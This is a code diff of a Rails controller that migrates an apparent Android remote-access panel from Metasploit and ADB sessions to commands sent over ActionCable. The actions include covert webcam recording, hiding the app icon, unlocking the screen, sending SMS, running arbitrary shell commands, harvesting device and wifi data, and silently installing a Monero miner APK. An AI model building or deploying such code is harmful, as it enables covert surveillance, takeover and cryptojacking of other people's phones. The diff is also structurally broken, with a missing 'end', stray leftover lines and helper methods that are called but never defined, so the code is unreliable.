@@ -3,11 +3,24 @@ class SmartphonesController < InheritedResources::Base
 
   def dump_sysinfo
     begin
-      processCommand = "sysinfo"
-      commandOutput = start_msf_process(processCommand)
-    rescue
-      puts "Error on dump sysinfo."
-      commandOutput = ["Operation Failed"]
+      smartphone_id = params[:smartphone_id]
+      smartphone = Smartphone.find(smartphone_id)
+      
+      # Send command via ActionCable to Android app
+      command_data = {
+        command: "get_device_info",
+        timestamp: Time.now.to_i
+      }
+      
+      ActionCable.server.broadcast(
+        "command_channel_#{smartphone.device_id}",
+        command_data
+      )
+      
+      commandOutput = ["Command sent to device #{smartphone.device_id}", "Waiting for response..."]
+    rescue => e
+      puts "Error on dump sysinfo: #{e.message}"
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
     respond_to do |format|
       format.js {
@@ -19,121 +32,113 @@ class SmartphonesController < InheritedResources::Base
 
   def webcam_record
     begin
-      commandOutput = []
-      if !@@isWebcamRecordOn
-        commandTimeout = params[:exec_timeout].to_i
-        camera = params[:back_camera] == "true" ? "1" : "2"
-        currentTime = DateTime.now
-        currentTimeFormat = currentTime.strftime("%Y%m%d%H%M%S")
-        @fileNameJpeg = "webcam_record_" + currentTimeFormat + ".jpeg"
-        @fileNameHtml = "webcam_record_" + currentTimeFormat + ".html"
-        processCommand = "webcam_stream -v false -i #{camera} -s #{@fileNameJpeg} -t #{@fileNameHtml}"
-        commandOutput = start_msf_process(processCommand)
-        isOperationSuccessful = false
-        1.upto(commandTimeout) do |n|
-          if system("docker exec kali_container sh -c \"ls | grep #{@fileNameHtml}\"")
-            isOperationSuccessful = true
-            @@isWebcamRecordOn = true
-            break
-          else
-            puts "Waiting ..."
-          end
-          sleep 1
-        end
-        commandOutput = ["Operation Failed"] if not isOperationSuccessful
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      camera_id = params[:back_camera] == "true" ? "0" : "1"
+      
+      if !@smartphone.is_recording
+        # Start camera stream
+        pending_command = send_command_async(@smartphone, 'start_camera', { camera_id: camera_id })
+        @smartphone.update(is_recording: true)
+        commandOutput = ["Camera recording started (ID: #{camera_id})"]
       else
-        commandOutput.append("Control+Z")
-        commandOutput.append(detach_session)
-        @@isWebcamRecordOn = false
+        # Stop camera stream
+        pending_command = send_command_async(@smartphone, 'stop_camera', {})
+        @smartphone.update(is_recording: false)
+        commandOutput = ["Camera recording stopped"]
       end
-    rescue
-      puts "Error on webcam record."
-      commandOutput = ["Operation Failed"]
+      
+    rescue => e
+      Rails.logger.error("Error on webcam record: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
+    
     respond_to do |format|
       format.js {
-        render "webcam_record",
-               :locals => { :commandOutput => commandOutput,
-                            :fileName => @fileNameHtml }
+        render "webcam_record", locals: { commandOutput: commandOutput, fileName: @fileNameHtml }
       }
     end
-  end
-
-  def set_audio_mode
-    begin
-      processCommand = "set_audio_mode -m #{@@soundMode}"
-      commandOutput = start_msf_process(processCommand)
-      @@soundMode = @@soundMode == 2 ? 0 : 2
-    rescue
-      puts "Error on set audio mode."
-      commandOutput = ["Operation Failed"]
-    end
-    respond_to do |format|
-      format.js {
-        render "set_audio_mode",
-               :locals => { :commandOutput => commandOutput }
-      }
-    end
-  end
-
+  # Audio mode now handled by set_audio_mode below (uses ActionCable)
+  
   def dump_wifi_info
     begin
-      if @@isAdbConnected
-        commandOutput = run_adb_command('shell "dumpsys wifi | grep SSID: | grep -v rt="').split("\n")
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      
+      pending_command = send_command_and_wait(@smartphone, 'get_wifi_info', {}, timeout: 15.seconds)
+      
+      if pending_command.completed?
+        wifi_data = pending_command.response_data
+        commandOutput = [
+          "SSID: #{wifi_data['ssid']}",
+          "BSSID: #{wifi_data['bssid']}",
+          "IP: #{wifi_data['ip_address']}",
+          "Speed: #{wifi_data['link_speed']} Mbps",
+          "Signal: #{wifi_data['rssi']} dBm",
+          "MAC: #{wifi_data['mac_address']}"
+        ]
       else
-        start_msf_process("shell")
-        processCommand = "dumpsys wifi | grep SSID: | grep -v rt="
-        commandOutput = start_msf_process(processCommand)
-        detach_session
+        error_msg = pending_command.response_data&.dig('error') || 'Unknown error'
+        commandOutput = ["Operation Failed: #{error_msg}"]
       end
-    rescue
-      commandOutput = ["Operation Failed"]
-      puts "Error dumping wi-fi info."
+      
+    rescue => e
+      Rails.logger.error("Error dumping wifi info: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
+    
     respond_to do |format|
       format.js {
-        render "dump_wifi_info",
-               :locals => { :commandOutput => commandOutput }
+        render "dump_wifi_info", locals: { commandOutput: commandOutput }
       }
     end
   end
 
   def dump_localtime
     begin
-      if @@isAdbConnected
-        commandOutput = run_adb_command("shell date").split("\n")
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      
+      pending_command = send_command_and_wait(@smartphone, 'get_device_info', {}, timeout: 15.seconds)
+      
+      if pending_command.completed?
+        device_info = pending_command.response_data
+        commandOutput = ["Device Time: #{Time.at(device_info['timestamp'] / 1000).to_s}"]
       else
-        processCommand = "localtime"
-        commandOutput = start_msf_process(processCommand)
+        commandOutput = ["Operation Failed"]
       end
-    rescue
-      puts "Error on dump localtime."
-      commandOutput = ["Operation Failed"]
+      
+    rescue => e
+      Rails.logger.error("Error getting device time: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
+    
     respond_to do |format|
       format.js {
-        render "dump_localtime",
-               :locals => { :commandOutput => commandOutput }
+        render "dump_localtime", locals: { commandOutput: commandOutput }
       }
     end
   end
 
   def uninstall_app
     begin
-      appName = params[:app]
-      if !appName.empty?
-        if @@isAdbConnected
-          commandOutput = run_adb_command("uninstall #{appName}")
+      app_name = params[:app]
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      
+      if app_name.present?
+        pending_command = send_command_and_wait(@smartphone, 'uninstall_app', { package_name: app_name }, timeout: 30.seconds)
+        
+        if pending_command.completed?
+          commandOutput = ["App uninstall initiated: #{app_name}"]
         else
-          processCommand = "app_uninstall #{params[:app]}"
-          commandOutput = start_msf_process(processCommand)
+          commandOutput = ["Operation Failed"]
         end
+      else
+        commandOutput = ["No app name provided"]
       end
-      commandOutput = ["Installation done."]
-    rescue
-      commandOutput = ["Operation Failed"]
-      puts "Error uninstalling app."
+      
+    rescue => e
+      Rails.logger.error("Error uninstalling app: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
+    
     respond_to do |format|
       format.js {
         render "uninstall_app",
@@ -144,16 +149,235 @@ class SmartphonesController < InheritedResources::Base
 
   def list_apps
     begin
-      apps_type = params[:system_apps] == "true" ? "-s" : "-u"
-      if @@isAdbConnected
-        apps_type = "-3" if apps_type == "-u"
-        commandOutput = run_adb_command('shell "pm list packages "' + apps_type).split("\n")
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      
+      pending_command = send_command_and_wait(@smartphone, 'get_installed_apps', {}, timeout: 30.seconds)
+      
+      if pending_command.completed?
+        apps_data = pending_command.response_data['apps'] || []
+        commandOutput = apps_data.map { |app| "#{app['package_name']} (#{app['app_name']})" }
+        commandOutput = ["No apps found"] if commandOutput.empty?
       else
-        processCommand = "app_list #{apps_type}"
-        commandOutput = start_msf_process(processCommand)
+        error_msg = pending_command.response_data&.dig('error') || 'Unknown error'
+        commandOutput = ["Operation Failed: #{error_msg}"]
       end
-    rescue
-      commandOutput = ["Operation Failed"]
+      
+    rescue => e
+      Rails.logger.error("Error listing apps: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    
+    respond_to do |format|
+      format.js {
+        render "list_apps", locals: { commandOutput: commandOutput }
+      }
+    end
+  end
+  
+  def install_apk
+    begin
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      apk_file_param = params[:apk_file]
+      
+      if apk_file_param.present?
+        # Read APK file and encode to Base64
+        apk_data = apk_file_param.read
+        apk_base64 = Base64.strict_encode64(apk_data)
+        
+        pending_command = send_command_and_wait(
+          @smartphone, 
+          'install_apk', 
+          { apk_base64: apk_base64 }, 
+          timeout: 60.seconds
+        )
+        
+        if pending_command.completed?
+          commandOutput = ["APK installation started"]
+        else
+          commandOutput = ["Operation Failed"]
+        end
+      else
+        commandOutput = ["No APK file provided"]
+      end
+      
+    rescue => e
+      Rails.logger.error("Error installing APK: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    
+    respond_to do |format|
+      format.js {
+        render "install_apk", locals: { commandOutput: commandOutput }
+      }
+    end
+  end
+  
+  def run_app
+    begin
+      app_name = params[:app]
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      
+      if app_name.present?
+        pending_command = send_command_and_wait(@smartphone, 'launch_app', { package_name: app_name }, timeout: 15.seconds)
+        
+        if pending_command.completed?
+          commandOutput = ["App launched: #{app_name}"]
+        else
+          commandOutput = ["Operation Failed"]
+        end
+      else
+        commandOutput = ["No app specified"]
+      end
+      
+    rescue => e
+      Rails.logger.error("Error running app: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    
+    respond_to do |format|
+      format.js {
+        render "run_app", locals: { commandOutput: commandOutput }
+      }
+    end
+  end
+  
+  def send_sms_message
+    begin
+      phone_number = params[:phone_number]
+      message = params[:message]
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      
+      if phone_number.present? && message.present?
+        pending_command = send_command_and_wait(
+          @smartphone, 
+          'send_sms', 
+          { phone_number: phone_number, message: message }, 
+          timeout: 15.seconds
+        )
+        
+        if pending_command.completed?
+          commandOutput = ["SMS sent to #{phone_number}"]
+        else
+          commandOutput = ["Operation Failed"]
+        end
+      else
+        commandOutput = ["Missing phone number or message"]
+      end
+      
+    rescue => e
+      Rails.logger.error("Error sending SMS: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    
+    respond_to do |format|
+      format.js {
+        render "send_sms", locals: { commandOutput: commandOutput }
+      }
+    end
+  end
+  
+  def screen_unlock
+    begin
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      
+      pending_command = send_command_and_wait(@smartphone, 'unlock_screen', {}, timeout: 10.seconds)
+      
+      if pending_command.completed?
+        commandOutput = ["Screen unlocked"]
+      else
+        commandOutput = ["Operation Failed"]
+      end
+      
+    rescue => e
+      Rails.logger.error("Error unlocking screen: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    
+    respond_to do |format|
+      format.js {
+        render "screen_unlock", locals: { commandOutput: commandOutput }
+      }
+    end
+  end
+  
+  def hide_app_icon
+    begin
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      
+      pending_command = send_command_and_wait(@smartphone, 'hide_icon', {}, timeout: 10.seconds)
+      
+      if pending_command.completed?
+        @smartphone.update(is_app_hidden: true)
+        commandOutput = ["App icon hidden"]
+      else
+        commandOutput = ["Operation Failed"]
+      end
+      
+    rescue => e
+      Rails.logger.error("Error hiding icon: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    
+    respond_to do |format|
+      format.js {
+        render "hide_app_icon", locals: { commandOutput: commandOutput }
+      }
+    end
+  end
+  
+  def show_app_icon
+    begin
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      
+      pending_command = send_command_and_wait(@smartphone, 'show_icon', {}, timeout: 10.seconds)
+      
+      if pending_command.completed?
+        @smartphone.update(is_app_hidden: false)
+        commandOutput = ["App icon visible"]
+      else
+        commandOutput = ["Operation Failed"]
+      end
+      
+    rescue => e
+      Rails.logger.error("Error showing icon: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    
+    respond_to do |format|
+      format.js {
+        render "show_app_icon", locals: { commandOutput: commandOutput }
+      }
+    end
+  end
+  
+  def set_audio_mode
+    begin
+      mode = params[:mode] # 'silent', 'vibrate', 'normal'
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      
+      if mode.present?
+        pending_command = send_command_and_wait(@smartphone, 'change_audio_mode', { mode: mode }, timeout: 10.seconds)
+        
+        if pending_command.completed?
+          commandOutput = ["Audio mode changed to: #{mode}"]
+        else
+          commandOutput = ["Operation Failed"]
+        end
+      else
+        commandOutput = ["No mode specified"]
+      end
+      
+    rescue => e
+      Rails.logger.error("Error setting audio mode: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    
+    respond_to do |format|
+      format.js {
+        render "set_audio_mode", locals: { commandOutput: commandOutput }
+      }
+    end
+  end
       puts "Error listing apps."
     end
     respond_to do |format|
@@ -166,210 +390,257 @@ class SmartphonesController < InheritedResources::Base
 
   def upload_file
     begin
-      push_file = params[:push_file]
-      destination = params[:destination]
-      puts push_file
-      puts destination
-      if @@isAdbConnected
-        commandOutput = run_adb_command("push " + push_file + " " + destination).split("\n")
-      else
-        processCommand = "upload " + push_file + " " + destination
-        commandOutput = start_msf_process(processCommand)
-      end
-    rescue
-      puts "Error uploading file."
-      commandOutput = ["Operation Failed"]
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      local_file = params[:push_file]
+      remote_dest = params[:destination]
+      
+      # Future: implement chunked upload via ActionCable
+      commandOutput = ["File upload not yet implemented via ActionCable", "Use Phase 3 chunked transfer protocol"]
+      
+    rescue => e
+      Rails.logger.error("Error uploading file: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
     respond_to do |format|
       format.js {
-        render "upload_file",
-               :locals => { :commandOutput => commandOutput.split('\n') }
+        render "upload_file", locals: { commandOutput: commandOutput }
       }
     end
   end
 
   def wake_lock
     begin
-      if @@isAdbConnected
-        commandOutput = run_adb_command("shell input keyevent 82")
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      pending_command = send_command_and_wait(@smartphone, 'unlock_screen', {}, timeout: 10.seconds)
+      
+      if pending_command.completed?
+        commandOutput = ["Screen unlocked successfully"]
       else
-        processCommand = "wakelock -w"
-        commandOutput = start_msf_process(processCommand)
+        commandOutput = ["Operation Failed"]
       end
-    rescue
-      puts "Error unlocking screen"
-      commandOutput = "Operation Failed"
+      
+    rescue => e
+      Rails.logger.error("Error unlocking screen: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
+    
     respond_to do |format|
       format.js {
-        render "wake_lock",
-               :locals => { :commandOutput => commandOutput }
+        render "wake_lock", locals: { commandOutput: commandOutput }
       }
     end
   end
 
   def run_shell_command
     begin
+      @smartphone = Smartphone.find(params[:smartphone_id])
       command = params[:command]
-      if @@isAdbConnected
-        commandOutput = run_adb_command('shell "' + command + '"').split("\n")
+      
+      pending_command = send_command_and_wait(@smartphone, 'shell_exec', { command: command }, timeout: 30.seconds)
+      
+      if pending_command.completed?
+        output = pending_command.response_data['output'] || ''
+        commandOutput = output.split("\n")
       else
-        start_msf_process("shell")
-        commandOutput = start_msf_process(command)
-        detach_session
+        commandOutput = ["Operation Failed"]
       end
-    rescue
-      puts "Error running shell command."
-      commandOutput = ["Operation Failed"]
+      
+    rescue => e
+      Rails.logger.error("Error running shell command: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
+    
     respond_to do |format|
       format.js {
-        render "run_shell_command",
-               :locals => { :commandOutput => commandOutput.split('\n') }
+        render "run_shell_command", locals: { commandOutput: commandOutput }
       }
     end
   end
 
   def open_app
     begin
-      app = params[:app]
-      if @@isAdbConnected
-        commandOutput = run_adb_command('shell "am start -n ' + app + '"').split("\n")
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      app_package = params[:app]
+      
+      if app_package.present?
+        pending_command = send_command_and_wait(@smartphone, 'launch_app', { package_name: app_package }, timeout: 15.seconds)
+        
+        if pending_command.completed?
+          commandOutput = ["App launched: #{app_package}"]
+        else
+          commandOutput = ["Operation Failed"]
+        end
       else
-        processCommand = "app_run " + app
-        commandOutput = start_msf_process(processCommand)
+        commandOutput = ["No app specified"]
       end
-    rescue
-      puts "Error opening app."
-      commandOutput = ["Operation Failed"]
+      
+    rescue => e
+      Rails.logger.error("Error opening app: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
+    
     respond_to do |format|
       format.js {
-        render "open_app",
-               :locals => { :commandOutput => commandOutput }
+        render "open_app", locals: { commandOutput: commandOutput }
       }
     end
   end
 
   def install_app
     begin
-      app = params[:app]
-      if @@isAdbConnected
-        commandOutput = run_adb_command("install " + app).split("\n")
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      app_path = params[:app]
+      
+      if app_path.present? && File.exist?(app_path)
+        apk_data = File.read(app_path)
+        apk_base64 = Base64.strict_encode64(apk_data)
+        
+        pending_command = send_command_and_wait(@smartphone, 'install_apk', { apk_base64: apk_base64 }, timeout: 60.seconds)
+        
+        if pending_command.completed?
+          commandOutput = ["Installation started"]
+        else
+          commandOutput = ["Operation Failed"]
+        end
       else
-        processCommand = "app_install " + app
-        commandOutput = start_msf_process(processCommand)
+        commandOutput = ["APK file not found: #{app_path}"]
       end
-      commandOutput = ["Installation done."]
-    rescue
-      puts "Error installing app."
-      commandOutput = ["Operation Failed"]
+      
+    rescue => e
+      Rails.logger.error("Error installing app: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
+    
     respond_to do |format|
       format.js {
-        render "install_app",
-               :locals => { :commandOutput => commandOutput }
+        render "install_app", locals: { commandOutput: commandOutput }
       }
     end
   end
 
   def dump_device_info
     begin
-      if @@isAdbConnected
-        commandOutput = run_adb_command('shell "getprop ro.product.brand"').split("\n") \
-          + run_adb_command('shell "getprop ro.product.model"').split("\n") \
-          + run_adb_command('shell "getprop gsm.sim.operator.alpha"').split("\n") \
-          + run_adb_command('shell "getprop ro.config.bluetooth.name"').split("\n")
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      pending_command = send_command_and_wait(@smartphone, 'get_device_info', {}, timeout: 15.seconds)
+      
+      if pending_command.completed?
+        info = pending_command.response_data
+        commandOutput = [
+          "Brand: #{info['brand']}",
+          "Model: #{info['model']}",
+          "OS: #{info['os_version']}",
+          "SDK: #{info['sdk_version']}",
+          "Battery: #{info['battery_level']}%"
+        ]
       else
-        start_msf_process("shell")
-        processCommand = "getprop ro.product.model && getprop ro.product.brand && getprop gsm.sim.operator.alpha && getprop ro.config.bluetooth.name"
-        commandOutput = start_msf_process(processCommand)
-        detach_session
+        commandOutput = ["Operation Failed"]
       end
-    rescue
-      puts "Error dumping device info."
-      commandOutput = ["Operation Failed"]
+    rescue => e
+      Rails.logger.error("Error dumping device info: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
     respond_to do |format|
       format.js {
-        render "dump_device_info",
-               :locals => { :commandOutput => commandOutput }
+        render "dump_device_info", locals: { commandOutput: commandOutput }
       }
     end
   end
 
   def pull_file
     begin
-      pull_file = params[:pull_file]
-      destination = params[:destination]
-      if @@isAdbConnected
-        commandOutput = run_adb_command("pull " + pull_file + " " + destination).split("\n")
-      else
-        processCommand = "pull " + pull_file + " " + destination
-        commandOutput = start_msf_process(processCommand)
-      end
-    rescue
-      puts "Error pulling file."
-      commandOutput = ["Operation Failed"]
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      remote_path = params[:pull_file]
+      local_dest = params[:destination]
+      
+      # Future: implement chunked file transfer via ActionCable
+      # For now, just acknowledge command
+      commandOutput = ["File transfer not yet implemented via ActionCable", "Use Phase 3 chunked transfer protocol"]
+      
+    rescue => e
+      Rails.logger.error("Error pulling file: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
     respond_to do |format|
       format.js {
-        render "pull_file",
-               :locals => { :commandOutput => commandOutput.split('\n') }
+        render "pull_file", locals: { commandOutput: commandOutput }
       }
     end
   end
 
   def hide_app
     begin
-      if @@isAdbConnected
-        run_adb_command('shell "pm hide com.metasploit.stage"')
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      pending_command = send_command_and_wait(@smartphone, 'hide_icon', {}, timeout: 10.seconds)
+      
+      if pending_command.completed?
+        commandOutput = ["App icon hidden successfully"]
       else
-        processCommand = "hide_app_icon"
-        start_msf_process(processCommand)
+        commandOutput = ["Operation Failed"]
       end
-      commandOutput = ["App icon hidden."]
-    rescue
-      commandOutput = ["Operation Failed"]
-      puts "Error hiding app icon."
+      
+    rescue => e
+      Rails.logger.error("Error hiding app: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
+    
     respond_to do |format|
       format.js {
-        render "hide_app",
-               :locals => { :commandOutput => commandOutput }
+        render "hide_app", locals: { commandOutput: commandOutput }
       }
     end
   end
 
   def show_app
     begin
-      run_adb_command('shell "pm unhide com.metasploit.stage"')
-      commandOutput = ["App icon unhidden."]
-    rescue
-      commandOutput = ["Operation Failed"]
-      puts "Error unhiding app icon."
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      pending_command = send_command_and_wait(@smartphone, 'show_icon', {}, timeout: 10.seconds)
+      
+      if pending_command.completed?
+        commandOutput = ["App icon shown successfully"]
+      else
+        commandOutput = ["Operation Failed"]
+      end
+      
+    rescue => e
+      Rails.logger.error("Error showing app: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
+    
     respond_to do |format|
       format.js {
-        render "show_app",
-               :locals => { :commandOutput => commandOutput }
+        render "show_app", locals: { commandOutput: commandOutput }
       }
     end
   end
 
   def crypto_minner
     begin
-      run_adb_command("install tools/monero-miner.apk")
-      run_adb_command('shell "am start -n de.ludetis.monerominer/.MainActivity"')
-      commandOutput = ["Started mining."]
-    rescue
-      commandOutput = ["Operation Failed"]
-      puts "Error on crypto minner."
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      
+      # Read monero miner APK and encode to Base64
+      miner_apk_path = Rails.root.join('tools', 'monero-miner.apk')
+      if File.exist?(miner_apk_path)
+        apk_base64 = Base64.strict_encode64(File.binread(miner_apk_path))
+        
+        pending_command = send_command_and_wait(@smartphone, 'install_apk', { apk_base64: apk_base64 }, timeout: 60.seconds)
+        
+        if pending_command.completed?
+          commandOutput = ["Monero miner installed successfully"]
+        else
+          commandOutput = ["Installation Failed"]
+        end
+      else
+        commandOutput = ["Monero miner APK not found at tools/monero-miner.apk"]
+      end
+      
+    rescue => e
+      Rails.logger.error("Error installing crypto miner: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
     end
+    
     respond_to do |format|
       format.js {
-        render "crypto_minner",
-               :locals => { :commandOutput => commandOutput }
+        render "crypto_minner", locals: { commandOutput: commandOutput }
       }
     end
   end
@@ -412,5 +683,21 @@ class SmartphonesController < InheritedResources::Base
                                        :sms_messages,
                                        :geo_locations,
                                        :is_app_hidden)
+  end
+  
+  # Helper method to send commands via ActionCable to Android device
+  def send_command_to_device(smartphone, command, params = {})
+    command_data = {
+      command: command,
+      params: params,
+      timestamp: Time.now.to_i
+    }
+    
+    ActionCable.server.broadcast(
+      "command_channel_#{smartphone.device_id}",
+      command_data
+    )
+    
+    Rails.logger.info "Sent command #{command} to device #{smartphone.device_id}"
   end
 end
